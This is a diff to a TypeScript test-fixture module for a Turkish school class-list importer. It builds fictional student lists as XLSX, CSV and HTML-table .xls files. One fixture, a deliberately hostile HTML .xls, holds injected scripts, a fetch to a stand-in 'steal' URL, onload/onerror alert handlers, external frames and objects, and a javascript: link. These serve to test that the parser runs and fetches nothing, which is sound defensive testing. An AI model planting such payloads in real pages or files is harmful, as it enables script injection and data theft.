@@ -96,6 +96,111 @@ export function utf16Tsv(): Buffer {
   return Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(text, 'utf16le')]);
 }
 
+// ---------------------------------------------------------------- several classes in one file (S20c, D-171)
+/**
+ * A fictional school-wide list: [number, given names, family name, class label as written]. Class
+ * labels use the spellings exports mix ("3/A", "3-A", "3 A", "3. Sınıf / B Şubesi"), one class the
+ * test school does not have ("5/C") and one row without a class.
+ */
+export const MULTI_CLASS_STUDENTS: Array<[string, string, string, string]> = [
+  ['5101', 'DEFNE', 'KURGUOĞLU', '3/A'],
+  ['5102', 'ARAS', 'ÖRNEKSOY', '3/A'],
+  ['5103', 'NİL', 'DENEMECİ', '3-A'],
+  ['5104', 'UMUT', 'TASLAKÇI', '3 A'],
+  ['5201', 'IŞIL', 'HAYALİ', '3. Sınıf / B Şubesi'],
+  ['5202', 'ÇINAR', 'MASALCI', '3/B'],
+  ['5301', 'EFE', 'SANALTÜRK', '5/C'],
+  ['5302', 'ÖYKÜ', 'KURMACA', '5/C'],
+  ['5401', 'TOPRAK', 'ÖRNEKÇİ', ''],
+];
+
+const MULTI_HEADER = ['S.No', 'Öğrenci No', 'Adı', 'Soyadı', 'Sınıfı/Şubesi'];
+
+/** e-Okul-like rows: title rows, header, the header repeated after a page break, a page footer. */
+export function multiClassRows(): string[][] {
+  const rows: string[][] = [['KARTAL YUVASI İLKOKULU (KURGUSAL)'], ['OKUL ÖĞRENCİ LİSTESİ'], [], MULTI_HEADER];
+  MULTI_CLASS_STUDENTS.forEach(([no, given, family, cls], i) => {
+    if (i === 5) rows.push(['Sayfa 1 / 2'], [], MULTI_HEADER);
+    rows.push([String(i + 1), no, given, family, cls]);
+  });
+  rows.push([], ['Sayfa 2 / 2']);
+  return rows;
+}
+
+export function multiClassXlsx(): Buffer {
+  const wb = XLSX.utils.book_new();
+  XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(multiClassRows()), 'Okul Listesi');
+  return XLSX.write(wb, { type: 'buffer', bookType: 'xlsx' }) as Buffer;
+}
+
+/** The same list as a Turkish Excel "CSV (semicolon)" in UTF-8 with a BOM. */
+export function multiClassCsv(): Buffer {
+  const lines = ['Öğrenci No;Adı;Soyadı;Sınıfı/Şubesi', ...MULTI_CLASS_STUDENTS.map(([n, g, f, c]) => `${n};${g};${f};${c}`)];
+  return Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(lines.join('\r\n') + '\r\n', 'utf8')]);
+}
+
+const htmlEsc = (s: string) => s.replace(/&/gu, '&amp;').replace(/</gu, '&lt;').replace(/>/gu, '&gt;');
+
+/**
+ * An HTML table saved as `.xls`, as some school systems export lists: Excel's HTML flavour with
+ * office namespaces, a style block, a conditional comment, a merged title row and Turkish letters
+ * partly written as character references.
+ */
+export function htmlTableXls(rows: string[][] = multiClassRows()): Buffer {
+  const body = rows
+    .map((r, i) => (i < 2 && r.length === 1 ? `<tr><td colspan="5" class="xl65">${htmlEsc(r[0]!)}</td></tr>` : `<tr>${r.map((c) => `<td class=xl66 x:str>${htmlEsc(c).replace(/Ç/gu, '&Ccedil;').replace(/ş/gu, '&#351;')}</td>`).join('')}</tr>`))
+    .join('\n');
+  const html = `<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel">
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Liste</title>
+<style>td { mso-number-format:"\\@"; } .xl65 { font-weight: 700 }</style>
+<!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>Liste</x:Name></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]-->
+</head><body><table border="1">
+${body}
+</table></body></html>`;
+  return Buffer.from(html, 'utf8');
+}
+
+/** Marker text that must never reach a row: it is inside scripts, styles, comments, attributes and frames. */
+export const HOSTILE_MARKER = 'ZARARLI';
+
+/**
+ * A hostile HTML-table .xls: scripts (also ones that write table rows), event handlers, external
+ * images, stylesheets and frames (nothing may be fetched or run), rows inside comments, a nested
+ * layout table, broken character references and an unterminated tag at the end.
+ */
+export function hostileHtmlXls(): Buffer {
+  const html = `<!DOCTYPE html><html><head>
+<script>document.write('<table><tr><td>9999</td><td>${HOSTILE_MARKER} SCRIPT</td></tr></table>'); fetch('https://example.org/steal')</script>
+<link rel="stylesheet" href="https://example.org/${HOSTILE_MARKER}.css"><style>td::before { content: "${HOSTILE_MARKER}" }</style>
+</head><body onload="alert('${HOSTILE_MARKER}')">
+<!-- <table><tr><td>8888</td><td>${HOSTILE_MARKER} COMMENT</td></tr></table> -->
+<iframe src="https://example.org/${HOSTILE_MARKER}"><table><tr><td>7777</td><td>${HOSTILE_MARKER} FRAME</td></tr></table></iframe>
+<table><tr><td>
+  <table>
+    <tr><th>Öğrenci No</th><th>Adı Soyadı</th><th>Sınıfı</th></tr>
+    <tr><td>6101</td><td><img src="https://example.org/${HOSTILE_MARKER}.png" onerror="alert(1)">Ece Kurgu</td><td>3/A</td></tr>
+    <tr><td>6102</td><td title="${HOSTILE_MARKER}">Kaan Örnek<script>alert('${HOSTILE_MARKER}')</script></td><td>3-A</td></tr>
+    <tr><td>6103</td><td>Ada&#0; Deneme&#x110000;&bogus;</td><td>3 A</td></tr>
+    <tr><td>6104</td><td><svg><text>${HOSTILE_MARKER}</text></svg>Mert Taslak</td><td>3/A</td></tr>
+  </table>
+</td></tr></table>
+<object data="https://example.org/${HOSTILE_MARKER}.swf"><td>${HOSTILE_MARKER} OBJECT</td></object>
+<table><tr><td>6105</td><td>Son Satır<a href="javascript:alert(1)"`;
+  return Buffer.from(html, 'utf8');
+}
+
+/** A huge HTML table (far more rows and columns than any class list) plus one enormous cell. */
+export function hugeHtmlXls(rows = 4000, cols = 90): Buffer {
+  const parts: string[] = ['<html><body><table>', `<tr><td>Öğrenci No</td><td>Adı Soyadı</td><td>${'Ç'.repeat(200_000)}</td></tr>`];
+  for (let r = 0; r < rows; r++) {
+    let tr = `<tr><td>${100000 + r}</td><td>Kurgu Öğrenci ${r}</td>`;
+    for (let c = 2; c < cols; c++) tr += `<td colspan="1">${c}</td>`;
+    parts.push(`${tr}</tr>`);
+  }
+  parts.push('</table></body></html>');
+  return Buffer.from(parts.join('\n'), 'utf8');
+}
+
 // ---------------------------------------------------------------- DOCX
 const esc = (s: string) => s.replace(/&/gu, '&amp;').replace(/</gu, '&lt;').replace(/>/gu, '&gt;');
 const para = (t: string) => `<w:p><w:r><w:t xml:space="preserve">${esc(t)}</w:t></w:r></w:p>`;
